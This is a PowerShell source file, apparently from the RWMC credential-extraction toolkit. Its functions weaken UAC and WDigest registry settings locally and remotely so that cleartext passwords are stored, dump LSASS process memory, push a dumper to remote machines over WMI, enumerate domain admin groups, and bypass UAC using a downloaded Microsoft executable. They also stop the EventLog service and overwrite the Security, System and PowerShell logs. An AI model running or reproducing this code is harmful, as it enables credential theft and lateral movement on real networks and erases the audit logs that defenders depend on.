function Set-RegistryKey($computername, $parentKey, $nameRegistryKey, $valueRegistryKey) {
<#
.SYNOPSIS
    Set a setting in the registry
    Author: Pierre-Alexandre Braeken (@pabraeken)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None 

.DESCRIPTION
    Set-RegistryKey allows for the configuration of a registry setting

.PARAMETER computername

.PARAMETER parentKey

.PARAMETER nameRegistryKey

.PARAMETER valueRegistryKey
    
.EXAMPLE
    C:\PS> Set-RegistryKey "Server1" "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" "LocalAccountTokenFilterPolicy" "1"
#>
    try{    
        $remoteBaseKeyObject = [microsoft.win32.registrykey]::OpenRemoteBaseKey('LocalMachine',$computername)     
        $regKey = $remoteBaseKeyObject.OpenSubKey($parentKey,$true)
        $regKey.Setvalue("$nameRegistryKey", "$valueRegistryKey", [Microsoft.Win32.RegistryValueKind]::DWORD) 
        $remoteBaseKeyObject.close()
    }
    catch {
        $_.Exception
    }
}

function Disable-UAC($computername) {
    $parentKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
    $nameRegistryKey = "LocalAccountTokenFilterPolicy"
    $valueRegistryKey = "1"

    $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $computername)
    $objRegKey= $objReg.OpenSubKey($parentKey)
    $test = $objRegkey.GetValue($nameRegistryKey)
    if($test -eq $null){    
        Set-RegistryKey $computername $parentKey $nameRegistryKey $valueRegistryKey     
        Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
        Stop-Script
    }
    else {
        if($test -ne 1){
            Set-RegistryKey $computername $parentKey $nameRegistryKey $valueRegistryKey     
            Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
            Stop-Script
        }
    }
}

function CreateDirectoryIfNeeded ( [string] $directory ) {
	if (!(Test-Path -Path $directory -type "Container")) {
		New-Item -type directory -Path $directory > $null
	}
}

function Set-SymbolServer {              
    $cacheDirectory = "c:\SYMBOLS\PUBLIC"     
    $refSrcPath = "$cacheDirectory*http://referencesource.microsoft.com/symbols"
    $msdlPath = "$cacheDirectory*http://msdl.microsoft.com/download/symbols"    
    $envPath = "SRV*$refSrcPath;SRV*$msdlPath"    
    CreateDirectoryIfNeeded -directory $cacheDirectory
    $env:_NT_SYMBOL_PATH = $envPath    
}

function Write-Minidump ($process, $dumpFilePath) {
    $windowsErrorReporting = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
    $windowsErrorReportingNativeMethods = $windowsErrorReporting.GetNestedType('NativeMethods', 'NonPublic')    
    $flags = [Reflection.BindingFlags] 'NonPublic, Static'
    $miniDumpWriteDump = $windowsErrorReportingNativeMethods.GetMethod('MiniDumpWriteDump', $flags)
    $miniDumpWithFullMemory = [UInt32] 2

    $processId = $process.Id
    $processName = $process.Name
    $processHandle = $process.Handle
    $processFileName = "$($processName).dmp"

    $processDumpPath = "$dumpFilePath\$processFileName"

    $fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create)
    try{
        $result = $miniDumpWriteDump.Invoke($null, @($processHandle,$processId,$fileStream.SafeFileHandle,$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))        
        if(!$result) {
            Write-Host "Error : cannot dump the process" -ForegroundColor Red
            $fileStream.Close()
            Stop-Script
        }
    }
    catch{
        $_.Exception()       
        Write-Host "Error : cannot dump the process" -ForegroundColor Red
        $fileStream.Close()
        Stop-Script 
    }
    $fileStream.Close()       
}

function Write-MiniDumpDBGHelp ($process, $dumpFilePath){
    $MethodDefinition = @'
[DllImport("DbgHelp.dll", CharSet = CharSet.Unicode)]
public static extern bool MiniDumpWriteDump(
    IntPtr hProcess,
    uint processId,
    IntPtr hFile,
    uint dumpType,
    IntPtr expParam,
    IntPtr userStreamParam,
    IntPtr callbackParam
    );
'@

    $dbghelp = Add-Type -MemberDefinition $MethodDefinition -Name 'dbghelp' -Namespace 'Win32' -PassThru

    $miniDumpWithFullMemory = [UInt32] 2

    $processId = $process.Id
    $processName = $process.Name
    $processHandle = $process.Handle
    $processFileName = "$($processName).dmp"

    $processDumpPath = "$dumpFilePath\$processFileName"

    $fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create)
    try{
        $result = $dbghelp::MiniDumpWriteDump($processHandle,$processId,$fileStream.SafeFileHandle.DangerousGetHandle(),$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)
        if(!$result) {
            Write-Host "Error : cannot dump the process" -ForegroundColor Red
            $fileStream.Close()
            Stop-Script
        }
    }
    catch{
        $_.Exception.Message
        Write-Host "Error : cannot dump the process" -ForegroundColor Red
        $fileStream.Close()
        Stop-Script
    }
    $fileStream.Close()
}

function Run-WmiRemoteProcess {
    Param(
        [string]$computername=$env:COMPUTERNAME,
        [string]$cmd=$(Throw "You must enter the full path to the command which will create the process."),
        [int]$timeout = 0
    )
 
    Write-Host "Process to create on $computername is $cmd"
    [wmiclass]$wmi="\\$computername\root\cimv2:win32_process"
    # Exit if the object didn't get created
    if (!$wmi) {return}
 
    try{
    $remote=$wmi.Create($cmd)
    }
    catch{
        $_.Exception
    }
    $test =$remote.returnvalue
    if ($remote.returnvalue -eq 0) {
        Write-Host ("Successfully launched $cmd on $computername with a process id of " + $remote.processid)
    } else {
        Write-Host ("Failed to launch $cmd on $computername. ReturnValue is " + $remote.ReturnValue)
    }    
    return
}

function Remote-Dumping($computername, $scriptPath, $logDirectoryPath) {
    Copy-Item -Path "$scriptPath\msdsc.exe" -Destination "\\$computername\c$\windows\temp\msdsc.exe"
    $dumpAProcessPath = "C:\Windows\temp\msdsc.exe"
    Run-WmiRemoteProcess $computername "$dumpAProcessPath lsass c:\windows\temp" | Wait-Process
    Start-Sleep -Seconds 15
    Copy-Item -Path "\\$computername\\c$\windows\temp\lsass.dmp" -Destination "$logDirectoryPath"
    Remove-Item -Force "\\$computername\c$\windows\temp\msdsc.exe"
    Remove-Item -Force "\\$computername\c$\windows\temp\lsass.dmp"        
    Write-Progress -Activity "msdsc log created" -status "Running..." -id 1
}

function Set-WdigestProvider {
    $parentKey = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
    $nameRegistryKey = "UseLogonCredential"
    $valueRegistryKey = "1"
    if(!(Get-ItemProperty -Path $parentKey -Name $nameRegistryKey -ErrorAction SilentlyContinue)){                  
        New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null            
        Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
        Stop-Script
    }
    else {
        $valueSetted = (Get-ItemProperty -Path  $parentKey  -Name $nameRegistryKey).$nameRegistryKey
        if($valueSetted -ne 1) {
            New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null
            Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
            Stop-Script
        }
    }
}

function Set-RemoteWdigestProvider ($server) {
    $parentKey = "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"
    $nameRegistryKey = "UseLogonCredential"
    $valueRegistryKey = "1"
    $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $server)
    $objRegKey= $objReg.OpenSubKey($parentKey)
    $test = $objRegkey.GetValue($nameRegistryKey)
    if($test -eq $null){    
        Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
        Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
        Stop-Script
    }
    else {
        if($test -ne 1){
            Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
            Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
            Stop-Script
        }
    }
}

function Write-InFile ($buffer, $chain) {
    [io.file]::WriteAllText($buffer, $chain) | Out-Null
}

function Call-MemoryWalker ($memoryWalker, $file, $fullScriptPath) {
    if($mode -eq "2016") {
        $tab = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q" -y "$scriptPath\misc\symbols2016TP3"
    }
    else {
        $tab = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q" 
    }
    return $tab
}

function Clean-String ($tab, $matches, $snapshot) {    
    if($snapshot -eq $true) {$toAdd = 8;$chain="Implicit"}
    else {$toAdd = 0;$chain = White-Rabbit42}
    $tabA = ($tab -split ' ')     
    if($mode -eq 132) { 
        $start = 20
        $fi = [array]::indexof($tabA,$chain) + 7 + $toAdd
        $foundT = $tabA[$fi]      
        $found = "$foundT"   
    }   
    else {
        if($mode -eq 232) {             
            $fi = [array]::indexof($tabA,$chain) + 7 + $toAdd
            $foundT = $tabA[$fi]      
            $found = "$foundT"   
        }   
        else {
            $fi = [array]::indexof($tabA,$chain) + 10 + $toAdd
            $found1 = $tabA[$fi]    
            $fi = [array]::indexof($tabA,$chain) + 11 + $toAdd
            $found2 = $tabA[$fi]    
            $found = "$found2$found1"   
        }
    }
    return $found
}

function Stop-Script () {   
    Begin{
        Write-Log -streamWriter $global:streamWriter -infoToLog "--- Script terminating ---"
    }
    Process{        
        "Script terminating..." 
        Write-Host "================================================================================================"
        End-Log -streamWriter $global:streamWriter       
        Exit
    }
}

function Test-InternetConnection {
    if(![Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]'{DCB00C01-570F-4A9B-8D69-199FDBA5723B}')).IsConnectedToInternet){
        Write-Host "The script need an Internet Connection to run" -f Red    
        Stop-Script
    }
}

function Test-IsInLocalAdministratorsGroup {
    $me = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name    
    $group = Get-CimInstance -ClassName Win32_Group  -Filter "Name = 'Administrators'"    
    $administrators = Get-CimAssociatedInstance -InputObject $group -ResultClassName Win32_UserAccount | select -ExpandProperty Caption         
    if ($administrators -notcontains $me) {
        $false
    }
    else {
        $true
    }
}

function Test-LocalAdminRights {
    $myComputer = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
    $myUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $amIAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent())
    $adminFlag = $amIAdmin.IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if($adminFlag -eq $true){
        $adminMessage = " with administrator rights on " 
    }
    else {
        $adminMessage = " without administrator rights on "
    }

    Write-Host "RWMC runs with user " -nonewline; Write-Host $myUser.Name -f Red -nonewline; Write-Host $adminMessage -nonewline; Write-Host $myComputer -f Red -nonewline; Write-Host " computer"
    return $adminFlag
}

function Set-ActiveDirectoryInformations ($adFlag) {
    if (((gwmi win32_computersystem).partofdomain -eq $true) -and ($adFlag -eq 1)) {
        $partOfADomain = 1
        Import-Module activedirectory 
        if (Get-Module -ListAvailable -Name activedirectory) {
            Import-Module activedirectory
        } else {
            Write-Host "Module activedirectory does not exist, importing..."
            Import-Module ServerManager 
            Add-WindowsFeature RSAT-AD-PowerShell        
        }    
        $enterpriseAdminsGroup = "Enterprise Admins"
        $schemaAdminsGroup = "Schema Admins"
        $domainAdminsGroup = "Domain Admins"
        $administratorsGroup = " Administrators"
        $backupOperatorsGroup = "Backup Operators"    
        $global:enterpriseAdmins = ""
        $global:schemaAdmins = ""
        $global:domainAdmins = ""
        $global:administrators = ""
        $global:backupOperators = ""
        try {$global:enterpriseAdmins = (Get-ADGroupMember $enterpriseAdminsGroup -Recursive).DistinguishedName}catch{}
        try {$global:schemaAdmins = (Get-ADGroupMember $schemaAdminsGroup -Recursive).DistinguishedName}catch{}
        try {$global:domainAdmins = (Get-ADGroupMember $domainAdminsGroup -Recursive).DistinguishedName}catch{}
        try {$global:administrators = (Get-ADGroupMember $administratorsGroup -Recursive).DistinguishedName}catch{}
        try {$global:backupOperators = (Get-ADGroupMember $backupOperatorsGroup -Recursive).DistinguishedName}catch{}      
    }
}
function Bypass-UAC ($scriptPath, $logDirectoryPath) {               
    $fileToDownload = "http://download.microsoft.com/download/1/F/F/1FF5FEA9-C0F4-4B66-9373-278142683592/rootsupd.exe" 
    $fileDownloaded = "$logDirectoryPath\rootsupd.exe" 
     
    $webClient = new-object System.Net.WebClient 
    $webClient.DownloadFile($fileToDownload, $fileDownloaded)              

    &$fileDownloaded "/C:C:\Windows\System32\cmd.exe /C $scriptPath\msdsc.exe lsass $logDirectoryPath Title (launch the script from here, you are admin now)"    
}

function Post-HttpRequest($url,$parameters) { 
    $httpRequest = New-Object -ComObject Msxml2.XMLHTTP 
    $httpRequest.open("POST", $url, $false) 
    $httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
    $httpRequest.setRequestHeader("Content-length", $parameters.length); 
    $httpRequest.setRequestHeader("Connection", "close") 
    $httpRequest.send($parameters) 
    $httpRequest.responseText 
}

function Stop-Activities ($scriptPath) {
    $global:serviceToStop = Get-WmiObject -Class Win32_Service -Filter "Name='EventLog'"
    $serviceToStop.StopService() | Out-Null        
}

function Clear-Activities ($scriptPath) {    
    Copy-Item -Path "$scriptPath\misc\Microsoft-Windows-PowerShell%4Operational.evtx" -Destination "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx"
    Copy-Item -Path "$scriptPath\misc\Application.evtx" -Destination "C:\Windows\System32\winevt\Logs\Application.evtx"
    Copy-Item -Path "$scriptPath\misc\System.evtx" -Destination "C:\Windows\System32\winevt\Logs\System.evtx"
    Copy-Item -Path "$scriptPath\misc\Security.evtx" -Destination "C:\Windows\System32\winevt\Logs\Security.evtx"
    $serviceToStop.StartService() | Out-Null
}

function Get-OperatingSystemMode ($operatingSystem, $osArchitecture) {
    if($operatingSystem -eq "5.1.2600" -or $operatingSystem -eq "5.2.3790"){
        $mode = 3
    }
    else {
        if($operatingSystem -eq "6.1.7601" -or $operatingSystem -eq "6.1.7600"){
            if($osArchitecture -like "64*") {
                $mode = 1
            }
            else {
                $mode = 132
            }
        }
        else {
            if($operatingSystem -eq "6.2.9200"){
                $mode = 2
            }
            else{
                if($operatingSystem -eq "6.3.9600" -or $operatingSystem -eq "10.0.10240"){        
                    if($osArchitecture -like "64*") {  
                        if($operatingSystem -eq "6.3.9600"){
                            $mode = "8.1"       
                        }       
                        else {
                            $mode = "2r2"
                        }
                    }
                    else {
                        $mode = "232"
                    }
                }
                else {
                    if ($operatingSystem -eq "10.0.10514"){
                         $mode = "2016"
                    }
                    else {
                        Write-Output "The operating system could not be determined... terminating..."
                        Stop-Script 
                    }
                }
            }
        }
    }
    return $mode
}